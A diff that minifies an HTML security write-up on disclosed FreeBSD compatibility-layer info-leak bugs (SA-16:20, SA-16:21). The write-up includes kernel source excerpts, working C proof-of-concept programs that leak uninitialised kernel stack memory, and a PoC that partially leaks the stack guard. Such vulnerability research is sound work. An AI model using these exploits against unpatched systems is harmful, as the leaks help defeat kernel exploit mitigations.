@@ -1,68 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-	<head>
-		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-		<meta charset="UTF-8">
-		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
-		<link rel="stylesheet" type="text/css" href="css/core.css" />
-		<link rel="stylesheet" type="text/css" href="css/prism.css" />
-		<title>Analysis of stack disclosure vulnerabilities in FreeBSD compatibility layers</title>
-	</head>
-	
-	<body>
-		<div class="page">
-			<div class="container">
-				<div class="header">
-					<a href="contact.html" class="header-element">
-						Contact
-					</a>
-					
-					<a href="about.html" class="header-element">
-						About
-					</a>
-					
-					<a href="articles.html" class="header-element">
-						Articles
-					</a>
-					
-					<a href="index.html" class="header-element">
-						Home
-					</a>
-				</div>
-				
-				<h1>Analysis of stack disclosure vulnerabilities in FreeBSD compatibility layers</h1>
-				<span class="date">Initial publication: May 31st, 2016</span>
-				<hr>
-
-				<h2>Introduction</h2>
-				<p>
-					Arguably one of FreeBSD's most renowned features is its compatibility layers. In particular, FreeBSD provides compatibility layers for <a href="https://www.freebsd.org/doc/handbook/linuxemu.html">32-bit Linux binaries</a> and for legacy <a href="https://en.wikipedia.org/wiki/Berkeley_Software_Distribution#4.3BSD">4.3BSD</a> software. These are usually enabled by <a href="https://www.freebsd.org/doc/handbook/kernelconfig-building.html">building a custom kernel</a> with the <code>COMPAT_LINUX32</code> and <code>COMPAT_43</code> configuration options, however the Linux compatibility layer is also implemented as a separate kernel module, which can be loaded at runtime instead (<code>kldload linux</code>).
-				</p>
-				
-				<p>
-					I have discovered multiple information leak vulnerabilities in the implementations of these compatibility layers, which allow an unprivileged user to leak a large amount of potentially sensitive, uninitialised stack data. These vulnerabilities have been assigned <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-16:20.linux.asc">SA-16:20</a> and <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-16:21.43bsd.asc">SA-16:21</a> by the <a href="https://www.freebsd.org/security/reporting.html">FreeBSD Security Team</a>. A commit reference for the patch of these bugs may be found <a href="https://github.com/freebsd/freebsd/commit/a0c5a05de8c90bcf66b7d5f1a3beb895cc5e05f6">here</a>.
-				</p>
-
-				<p>
-					In this article I will give a quick explanation of each bug I found, along with some PoC code, and will then demonstrate the impact of this type of vulnerability by using one of the bugs to partially leak the stack guard.
-				</p>
-
-				<p>
-					All details and code excerpts for this article have been taken from FreeBSD 10.2-RELEASE (amd64), however, the vulnerabilities are present up to version 10.3 as well.
-				</p>
-
-				<br>
-
-				<h2><code>TIOCGSERIAL</code></h2>
-				<p>
-					The first vulnerability resides in the <code>TIOCGSERIAL</code> command of the Linux compatibility layer's <code>ioctl</code> handler for virtual terminals. This function only partially initialises contents of the <code>lss</code> struct before copying it to userland.
-				</p>
-
-				<p>
-					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/compat/linux/linux_ioctl.c#L920">sys/compat/linux/linux_ioctl.c</a></code>:
-				</p>
-
-				<pre><code class="language-c">static int
+<!DOCTYPE html> <html lang=en > <meta http-equiv=Content-Type  content="text/html; charset=UTF-8"> <meta charset=UTF-8 > <meta name=viewport  content="width=device-width, minimum-scale=1.0, maximum-scale=1.0"> <link rel=stylesheet  type="text/css" href="css/core.css" /> <link rel=stylesheet  type="text/css" href="css/prism.css" /> <title>Analysis of stack disclosure vulnerabilities in FreeBSD compatibility layers</title> <div class=page > <div class=container > <div class=header > <a href=contact.html  class=header-element > Contact </a> <a href=about.html  class=header-element > About </a> <a href=articles.html  class=header-element > Articles </a> <a href=index.html  class=header-element > Home </a> </div> <h1>Analysis of stack disclosure vulnerabilities in FreeBSD compatibility layers</h1> <span class=date >Initial publication: May 31st, 2016</span> <hr> <h2>Introduction</h2> <p> Arguably one of FreeBSD's most renowned features is its compatibility layers. In particular, FreeBSD provides compatibility layers for <a href="https://www.freebsd.org/doc/handbook/linuxemu.html">32-bit Linux binaries</a> and for legacy <a href="https://en.wikipedia.org/wiki/Berkeley_Software_Distribution#4.3BSD">4.3BSD</a> software. These are usually enabled by <a href="https://www.freebsd.org/doc/handbook/kernelconfig-building.html">building a custom kernel</a> with the <code>COMPAT_LINUX32</code> and <code>COMPAT_43</code> configuration options, however the Linux compatibility layer is also implemented as a separate kernel module, which can be loaded at runtime instead (<code>kldload linux</code>). </p> <p> I have discovered multiple information leak vulnerabilities in the implementations of these compatibility layers, which allow an unprivileged user to leak a large amount of potentially sensitive, uninitialised stack data. These vulnerabilities have been assigned <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-16:20.linux.asc">SA-16:20</a> and <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-16:21.43bsd.asc">SA-16:21</a> by the <a href="https://www.freebsd.org/security/reporting.html">FreeBSD Security Team</a>. A commit reference for the patch of these bugs may be found <a href="https://github.com/freebsd/freebsd/commit/a0c5a05de8c90bcf66b7d5f1a3beb895cc5e05f6">here</a>. </p> <p> In this article I will give a quick explanation of each bug I found, along with some PoC code, and will then demonstrate the impact of this type of vulnerability by using one of the bugs to partially leak the stack guard. </p> <p> All details and code excerpts for this article have been taken from FreeBSD 10.2-RELEASE (amd64), however, the vulnerabilities are present up to version 10.3 as well. </p> <br> <h2><code>TIOCGSERIAL</code></h2> <p> The first vulnerability resides in the <code>TIOCGSERIAL</code> command of the Linux compatibility layer's <code>ioctl</code> handler for virtual terminals. This function only partially initialises contents of the <code>lss</code> struct before copying it to userland. </p> <p> <code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/compat/linux/linux_ioctl.c#L920">sys/compat/linux/linux_ioctl.c</a></code>: </p> <pre><code class=language-c >static int
 linux_ioctl_termio(struct thread *td, struct linux_ioctl_args *args)
 {
 	struct termios bios;
@@ -91,19 +27,7 @@ linux_ioctl_termio(struct thread *td, struct linux_ioctl_args *args)
 	
 	fdrop(fp, td);
 	return (error);
-}</code></pre>
-
-				<br>
-
-				<p>
-					By looking at the declaration of this struct type, it is immediately obvious that there is an issue.
-				</p>
-
-				<p>
-					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/compat/linux/linux_ioctl.c#L353">sys/compat/linux/linux_ioctl.c</a></code>:
-				</p>
-
-				<pre><code class="language-c">struct linux_serial_struct {
+}</code></pre> <br> <p> By looking at the declaration of this struct type, it is immediately obvious that there is an issue. </p> <p> <code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/compat/linux/linux_ioctl.c#L353">sys/compat/linux/linux_ioctl.c</a></code>: </p> <pre><code class=language-c >struct linux_serial_struct {
 	int	type;
 	int	line;
 	int	port;
@@ -118,22 +42,7 @@ linux_ioctl_termio(struct thread *td, struct linux_ioctl_args *args)
 	unsigned short closing_wait;
 	unsigned short closing_wait2;
 	int	reserved[4];
-};</code></pre>
-
-				<br>
-
-				<p>
-					Only the <code>type</code>, <code>flags</code>, and <code>close_delay</code> members of the struct are initialised before it is copied to userland; all other members will contain uninitialised stack data. In total, this command allows us to leak <code>50</code> bytes.
-				</p>
-
-				<br>
-
-				<h3>PoC</h3>
-				<p>
-					The following PoC code demonstrates triggering the <code>TIOCGSERIAL</code> bug, and displaying the leaked kernel memory; it needs to be compiled as a 32-bit Linux binary.
-				</p>
-
-				<pre><code class="language-c">#include &lt;stdio.h&gt;
+};</code></pre> <br> <p> Only the <code>type</code>, <code>flags</code>, and <code>close_delay</code> members of the struct are initialised before it is copied to userland; all other members will contain uninitialised stack data. In total, this command allows us to leak <code>50</code> bytes. </p> <br> <h3>PoC</h3> <p> The following PoC code demonstrates triggering the <code>TIOCGSERIAL</code> bug, and displaying the leaked kernel memory; it needs to be compiled as a 32-bit Linux binary. </p> <pre><code class=language-c >#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;stddef.h&gt;
 #include &lt;errno.h&gt;
@@ -182,15 +91,7 @@ int main(void) {
 	printf("  [+] Total bytes leaked: %zu\n", leaked);
 	
 	return 0;
-}</code></pre>
-
-				<br>
-
-				<p>
-					Sample output:
-				</p>
-
-				<pre><code>  [+] Total size: 60
+}</code></pre> <br> <p> Sample output: </p> <pre><code>  [+] Total size: 60
   [+] Contents:
 04 00 00 00 00 FE FF FF A0 80 5D 02 00 F8 FF FF
 00 00 00 00 00 FE FF FF 7B E3 8F 80 FF FF FF FF
@@ -199,26 +100,7 @@ int main(void) {
 0x00: initialised member `type` (4)
 0x10: initialised member `flags` (4)
 0x20: initialised member `close_delay` (2)
-  [+] Total bytes leaked: 50</code></pre>
-
-				<br>
-
-				<p>
-					Kernel pointers are clearly contained in the contents of this leaked memory, such as <code>0xffffffff808fe37b</code>.
-				</p>
-
-				<br>
-
-				<h2><code>sysinfo</code></h2>
-				<p>
-					The next vulnerability also affects the the Linux compatibility layer, and resides in the <code>sysinfo</code> system call implementation. This function only partially initialises contents of the <code>syinfo</code> struct before copying it to userland.
-				</p>
-
-				<p>
-					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/compat/linux/linux_misc.c#L116">sys/compat/linux/linux_misc.c</a></code>:
-				</p>
-
-				<pre><code class="language-c">struct l_sysinfo {
+  [+] Total bytes leaked: 50</code></pre> <br> <p> Kernel pointers are clearly contained in the contents of this leaked memory, such as <code>0xffffffff808fe37b</code>. </p> <br> <h2><code>sysinfo</code></h2> <p> The next vulnerability also affects the the Linux compatibility layer, and resides in the <code>sysinfo</code> system call implementation. This function only partially initialises contents of the <code>syinfo</code> struct before copying it to userland. </p> <p> <code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/compat/linux/linux_misc.c#L116">sys/compat/linux/linux_misc.c</a></code>: </p> <pre><code class=language-c >struct l_sysinfo {
 	l_long		uptime;		/* Seconds since boot */
 	l_ulong		loads[3];	/* 1, 5, and 15 minute load averages */
 #define LINUX_SYSINFO_LOADS_SCALE 65536
@@ -278,22 +160,7 @@ linux_sysinfo(struct thread *td, struct linux_sysinfo_args *args)
 	sysinfo.mem_unit = 1;
 
 	return (copyout(&amp;sysinfo, args->info, sizeof(sysinfo)));
-}</code></pre>
-
-				<br>
-
-				<p>
-					This bug is slightly more subtle because the leaked data hides in the padding bytes of the struct. The total amount of data leaked from this system call is <code>10</code> bytes.
-				</p>
-
-				<br>
-
-				<h3>PoC</h3>
-				<p>
-					The following PoC code demonstrates triggering the <code>sysinfo</code> bug, and displaying the leaked kernel memory; it needs to be compiled as a 32-bit Linux binary.
-				</p>
-
-				<pre><code class="language-c">#include &lt;stdio.h&gt;
+}</code></pre> <br> <p> This bug is slightly more subtle because the leaked data hides in the padding bytes of the struct. The total amount of data leaked from this system call is <code>10</code> bytes. </p> <br> <h3>PoC</h3> <p> The following PoC code demonstrates triggering the <code>sysinfo</code> bug, and displaying the leaked kernel memory; it needs to be compiled as a 32-bit Linux binary. </p> <pre><code class=language-c >#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;sys/sysinfo.h&gt;
 
@@ -315,31 +182,10 @@ int main(void) {
 	printf("  [+] %zu bytes total\n", sizeof(short) + sizeof(info._f));
 	
 	return 0;
-}</code></pre>
-
-				<br>
-
-				<p>
-					Sample output:
-				</p>
-
-				<pre><code>  [+] Leaked data:
+}</code></pre> <br> <p> Sample output: </p> <pre><code>  [+] Leaked data:
 00 00
 00 A0 06 28 00 00 00 00
-  [+] 10 bytes total</code></pre>
-
-				<br>
-
-				<h2><code>ostat</code></h2>
-				<p>
-					The final bug affects the 4.3BSD compatibility layer, and resides in the <code>cvtstat</code> function, which is used by the <code>ostat</code> and <code>ofstat</code> system calls. This function only partially initialises contents of the <code>ost</code> struct before copying it to userland.
-				</p>
-
-				<p>
-					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/vfs_syscalls.c#L2142">sys/kern/vfs_syscalls.c</a></code>:
-				</p>
-
-				<pre><code class="language-c">int
+  [+] 10 bytes total</code></pre> <br> <h2><code>ostat</code></h2> <p> The final bug affects the 4.3BSD compatibility layer, and resides in the <code>cvtstat</code> function, which is used by the <code>ostat</code> and <code>ofstat</code> system calls. This function only partially initialises contents of the <code>ost</code> struct before copying it to userland. </p> <p> <code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/vfs_syscalls.c#L2142">sys/kern/vfs_syscalls.c</a></code>: </p> <pre><code class=language-c >int
 ostat(td, uap)
 	struct thread *td;
 	register struct ostat_args /* {
@@ -387,22 +233,7 @@ cvtstat(st, ost)
 	ost->st_blocks = st->st_blocks;
 	ost->st_flags = st->st_flags;
 	ost->st_gen = st->st_gen;
-}</code></pre>
-
-				<br>
-				
-				<p>
-					This bug leaks a total of <code>4</code> bytes in the padding of the struct.
-				</p>
-				
-				<br>
-
-				<h3>PoC</h3>
-				<p>
-					The following PoC code demonstrates triggering the <code>ostat</code> bug, and displaying the leaked kernel memory; it can be compiled on FreeBSD using the default <code>clang</code> compiler.
-				</p>
-
-				<pre><code class="language-c">#include &lt;stdio.h&gt;
+}</code></pre> <br> <p> This bug leaks a total of <code>4</code> bytes in the padding of the struct. </p> <br> <h3>PoC</h3> <p> The following PoC code demonstrates triggering the <code>ostat</code> bug, and displaying the leaked kernel memory; it can be compiled on FreeBSD using the default <code>clang</code> compiler. </p> <pre><code class=language-c >#include &lt;stdio.h&gt;
 #include &lt;unistd.h&gt;
 
 int main(void) {
@@ -415,34 +246,9 @@ int main(void) {
 	printf("0x%02hhx 0x%02hhx\n", oub[18], oub[19]);
 	
 	return 0;
-}</code></pre>
-
-				<br>
-
-				<p>
-					Sample output:
-				</p>
-
-				<pre><code>  [+] Leaked data:
+}</code></pre> <br> <p> Sample output: </p> <pre><code>  [+] Leaked data:
 0xee 0x0f
-0x99 0x02</code></pre>
-
-				<br>
-
-				<h2>Leveraging contents of leaked data</h2>
-				<p>
-					The leaked memory for each vulnerability will contain different kinds of data depending on the stack frame of the previously called functions.
-				</p>
-
-				<p>
-					For example, we can demonstrate this by using the <code>LINUX_TIOCSSERIAL</code> command, which does nothing but <code>copyin</code> the user supplied struct onto the stack.
-				</p>
-
-				<p>
-					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/compat/linux/linux_ioctl.c#L929">sys/compat/linux/linux_ioctl.c</a></code>:
-				</p>
-
-				<pre><code class="language-c">	case LINUX_TIOCSSERIAL: {
+0x99 0x02</code></pre> <br> <h2>Leveraging contents of leaked data</h2> <p> The leaked memory for each vulnerability will contain different kinds of data depending on the stack frame of the previously called functions. </p> <p> For example, we can demonstrate this by using the <code>LINUX_TIOCSSERIAL</code> command, which does nothing but <code>copyin</code> the user supplied struct onto the stack. </p> <p> <code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/compat/linux/linux_ioctl.c#L929">sys/compat/linux/linux_ioctl.c</a></code>: </p> <pre><code class=language-c >	case LINUX_TIOCSSERIAL: {
 		struct linux_serial_struct lss;
 		error = copyin((void *)args->arg, &amp;lss, sizeof(lss));
 		if (error)
@@ -452,15 +258,7 @@ int main(void) {
 		 */
 		error = 0;
 		break;
-	}</code></pre>
-
-				<br>
-
-				<p>
-					By using this command, and then triggering the <code>TIOCGSERIAL</code> bug, we can observe reminants of the memory we passed to the previous call in our leaked data.
-				</p>
-
-				<pre><code class="language-c">#include &lt;stdio.h&gt;
+	}</code></pre> <br> <p> By using this command, and then triggering the <code>TIOCGSERIAL</code> bug, we can observe reminants of the memory we passed to the previous call in our leaked data. </p> <pre><code class=language-c >#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;stddef.h&gt;
 #include &lt;string.h&gt;
@@ -494,44 +292,11 @@ int main(void) {
 	hexDump(&amp;lss, sizeof(lss));
 	
 	return 0;
-}</code></pre>
-
-				<br>
-
-				<p>
-					Sample output:
-				</p>
-
-				<pre><code>  [+] Contents:
+}</code></pre> <br> <p> Sample output: </p> <pre><code>  [+] Contents:
 04 00 00 00 00 FE FF FF 90 C1 5D 02 00 F8 FF FF
 00 00 00 00 00 FE FF FF 7B E3 8F 80 FF FF FF FF
 00 00 61 61 61 61 61 61 28 59 31 00 00 FE FF FF
-18 59 31 00 00 FE FF FF 61 61 61 61</code></pre>
-
-				<br>
-
-				<h2>Targets to leak</h2>
-				<p>
-					For most modern operating systems, these kinds of info leaks are usually used to obtain kernel addresses, which can then be used to calculate the kernel slide, and bypass kernel ASLR. However, since FreeBSD still doesn't support kernel ASLR, I will instead focus on bypassing another exploit mitigation mechanism.
-				</p>
-				
-				<p>
-					We can use these bugs to attempt to leak the stack guard, which is incredibly valuable to an attacker because it can be used to enable exploitation of many kernel stack overflows which would otherwise be dismissed as being unexploitable (<a href="https://bugs.freebsd.org/bugzilla/show_bug.cgi?id=204643#c2">msdosfs_readdir</a> springs to mind).
-				</p>
-
-				<p>
-					To leak the stack guard, we just need to identify a system call with an appropriate stack frame that lines up the offset of the stack guard with an offset which we can read later.
-				</p>
-
-				<p>
-					Depending on the exact version and architecture of FreeBSD which you target, different system calls may be suitible for each bug, however, for this article I will just focus on FreeBSD 10.2-RELEASE for amd64.
-				</p>
-				
-				<p>
-					The following PoC code demonstrates leaking <code>2</code> bytes of the stack guard through the <code>sysinfo</code> bug by abusing the stack frame of <code>linux_newuname</code>; it needs to be compiled as a 32-bit Linux binary.
-				</p>
-				
-				<pre><code class="language-c">#include &lt;stdio.h&gt;
+18 59 31 00 00 FE FF FF 61 61 61 61</code></pre> <br> <h2>Targets to leak</h2> <p> For most modern operating systems, these kinds of info leaks are usually used to obtain kernel addresses, which can then be used to calculate the kernel slide, and bypass kernel ASLR. However, since FreeBSD still doesn't support kernel ASLR, I will instead focus on bypassing another exploit mitigation mechanism. </p> <p> We can use these bugs to attempt to leak the stack guard, which is incredibly valuable to an attacker because it can be used to enable exploitation of many kernel stack overflows which would otherwise be dismissed as being unexploitable (<a href="https://bugs.freebsd.org/bugzilla/show_bug.cgi?id=204643#c2">msdosfs_readdir</a> springs to mind). </p> <p> To leak the stack guard, we just need to identify a system call with an appropriate stack frame that lines up the offset of the stack guard with an offset which we can read later. </p> <p> Depending on the exact version and architecture of FreeBSD which you target, different system calls may be suitible for each bug, however, for this article I will just focus on FreeBSD 10.2-RELEASE for amd64. </p> <p> The following PoC code demonstrates leaking <code>2</code> bytes of the stack guard through the <code>sysinfo</code> bug by abusing the stack frame of <code>linux_newuname</code>; it needs to be compiled as a 32-bit Linux binary. </p> <pre><code class=language-c >#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;sys/sysinfo.h&gt;
 #include &lt;sys/utsname.h&gt;
@@ -545,27 +310,4 @@ int main(void) {
 	printf("  [+] Partial stack guard leak: 0x%04hX\n", *(short *)(((char *)&amp;info.procs) + 2));
 	
 	return 0;
-}</code></pre>
-				
-				<br>
-				
-				<p>
-					The easiest way to verify the output of the above program is to compare it to the stack guard leaked from a separate vulnerability, such as <code><a href="SETFKEY.html#frame">SETFKEY</a></code>. However, if your system has been patched against this vulnerability, you will have to either dump the stack guard with gdb, or write a custom kernel module.
-				</p>
-				
-				<br>
-				
-				<h2>Summary</h2>
-				<p>
-					Whilst the compatibility layers are an undoubtedly useful feature of FreeBSD, you should be aware that by using them, you will always expose your system to an increased attack surface.
-				</p>
-				
-				<p>
-					In this article I provided several examples of obvious info leaks I discovered in these layers, and demonstrated that their impact can be severe if an attacker has identified appropriate stack frames to leak sensitive data, like the stack guard.
-				</p>
-			</div>
-		</div>
-
-		<script src="js/prism.js" type="text/javascript"></script>
-	</body>
-</html>
+}</code></pre> <br> <p> The easiest way to verify the output of the above program is to compare it to the stack guard leaked from a separate vulnerability, such as <code><a href="SETFKEY.html#frame">SETFKEY</a></code>. However, if your system has been patched against this vulnerability, you will have to either dump the stack guard with gdb, or write a custom kernel module. </p> <br> <h2>Summary</h2> <p> Whilst the compatibility layers are an undoubtedly useful feature of FreeBSD, you should be aware that by using them, you will always expose your system to an increased attack surface. </p> <p> In this article I provided several examples of obvious info leaks I discovered in these layers, and demonstrated that their impact can be severe if an attacker has identified appropriate stack frames to leak sensitive data, like the stack guard. </p> </div> </div> <script src="js/prism.js" type="text/javascript"></script>
